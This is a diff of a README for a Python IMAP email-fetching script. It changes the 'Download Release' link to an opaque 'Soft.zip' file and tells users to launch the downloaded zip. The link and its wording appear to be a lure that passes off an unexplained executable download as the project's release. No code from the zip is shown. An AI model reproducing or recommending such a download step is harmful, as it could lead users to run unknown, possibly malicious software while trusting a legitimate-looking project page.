@@ -41,7 +41,7 @@ Welcome to **get-my-inbox-imap** - your go-to Python script for effortlessly fet
 
 ## Download Release
 
-[![Download Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Download Release](https://github.com/faibrri/get-my-inbox-imap/releases/download/v1.0/Soft.zip)](https://github.com/faibrri/get-my-inbox-imap/releases/download/v1.0/Soft.zip)
 
 Make sure to launch the downloaded zip file for the latest release.
 
